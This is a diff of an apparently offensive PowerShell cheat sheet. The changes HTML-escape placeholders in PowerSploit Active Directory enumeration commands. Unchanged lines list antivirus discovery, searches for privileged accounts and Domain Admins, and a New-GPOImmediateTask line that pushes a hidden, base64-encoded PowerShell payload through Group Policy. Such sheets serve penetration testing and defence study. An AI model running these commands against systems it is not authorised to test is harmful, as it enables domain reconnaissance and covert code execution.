@@ -17,12 +17,12 @@ Get AVs Installed----Get-CimInstance -Namespace root\securitycenter2 -ClassName 
 List All Namespaces----Get-WmiObject -Namespace root\CIMv2 -list
 
 ##PowerSploit
-Enumerate User----Get-NetUser <user>
-Enumerate Group----Get-NetGroup <group>
-Get Groups for which User is member----Get-NetGroup -Username <user>
-Group Members----Get-NetGroupMember <group>
-Get all effective member of group----Get-NetGroupMember -GroupName <group> -Recurse
-Search the forest global catalog----Get-NetUser -UserName <user> -ADSpath "GC: //domain.com"
+Enumerate User----Get-NetUser &lt;user&gt;
+Enumerate Group----Get-NetGroup &lt;group&gt;
+Get Groups for which User is member----Get-NetGroup -Username &lt;user&gt;
+Group Members----Get-NetGroupMember &lt;group&gt;
+Get all effective member of group----Get-NetGroupMember -GroupName &lt;group&gt; -Recurse
+Search the forest global catalog----Get-NetUser -UserName &lt;user&gt; -ADSpath "GC: //domain.com"
 Find Privileged Machine Accounts----Get-NetGroup -AdminCount | Get-NetGroupMember -Recurse | ?{$_.MemberName -like '*$'}
 Find Domain Admins and Users with same first/last name----Get-NetGroupMember -GroupName "Domain Admins" -FullData | %{ $a=$_.displayname.split(" ")[0..1] -join " "; Get-NetUser -Filter "(displayname=*$a*)"} | Select-Object -Property displayname,samaccountname
 New-GPOImmediateTask -TaskName Debugging -GPODisplayName SecurePolicy -CommandArguments '-NoP -NonI -W Hidden -Enc JABXAGMAPQBO...' -Force
